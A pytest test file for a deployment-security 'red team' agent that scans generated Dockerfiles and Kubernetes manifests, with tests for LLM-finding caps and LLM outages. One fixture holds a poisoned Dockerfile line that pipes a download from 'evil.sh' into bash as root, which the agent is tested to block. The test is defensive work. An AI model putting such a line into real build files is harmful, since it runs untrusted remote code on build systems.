from unittest.mock import patch

import pytest

from deploymint.agents.redteam import RedTeamAgent


class _NoLLM:
    enable_redteam = False

CLEAN_STATE = {
    "artifacts": {
        "dockerfile": "FROM python:3.11-slim\nUSER 10001\nCMD [\"python\", \"main.py\"]\n",
        "k8s_deployment": "kind: Deployment\n",
        "k8s_service": "kind: Service\n",
    },
    "analysis": {},
    "errors": [],
}

POISONED_STATE = {
    "artifacts": {
        "dockerfile": "FROM ubuntu:latest\nUSER root\n"
                      "RUN curl -sL http://evil.sh | bash\nCMD [\"python\", \"main.py\"]\n",
        "k8s_deployment": "kind: Deployment\n",
        "k8s_service": "kind: Service\n",
    },
    "analysis": {},
    "errors": [],
}


@pytest.mark.asyncio
async def test_deterministic_probes_block_without_any_llm_call():
    """Layer 1 must catch curl|bash even with no ANTHROPIC_API_KEY set at all —
    proven here by never mocking or reaching deploymint.core.llm.complete."""
    with patch("deploymint.agents.redteam.get_settings", return_value=_NoLLM()):
        out = await RedTeamAgent().run(dict(POISONED_STATE))
    sec = out["security"]
    assert sec["passed"] is False
    ids = {f["id"] for f in sec["findings"]}
    assert "RT_CURL_PIPE_SH" in ids


@pytest.mark.asyncio
async def test_clean_artifacts_pass():
    with patch("deploymint.agents.redteam.get_settings", return_value=_NoLLM()):
        out = await RedTeamAgent().run(dict(CLEAN_STATE))
    assert out["security"]["passed"] is True


@pytest.mark.asyncio
async def test_llm_layer_findings_are_capped_below_critical():
    hallucinated = '{"findings": [{"id":"RT_LLM_001","severity":"critical",' \
                   '"message":"looks scary","remediation":"none"}]}'
    with patch("deploymint.core.llm.complete", return_value=hallucinated):
        out = await RedTeamAgent().run(dict(CLEAN_STATE))
    sec = out["security"]
    llm_findings = [f for f in sec["findings"] if f["id"] == "RT_LLM_001"]
    assert llm_findings and llm_findings[0]["severity"] == "high"
    # An LLM finding alone, capped below critical, must never block a deploy.
    assert sec["passed"] is True


@pytest.mark.asyncio
async def test_llm_unavailable_does_not_crash_the_agent():
    from deploymint.core.llm import LLMUnavailable

    with patch("deploymint.core.llm.complete", side_effect=LLMUnavailable("no key")):
        out = await RedTeamAgent().run(dict(CLEAN_STATE))
    ids = {f["id"] for f in out["security"]["findings"]}
    assert "RT_LLM_UNAVAILABLE" in ids
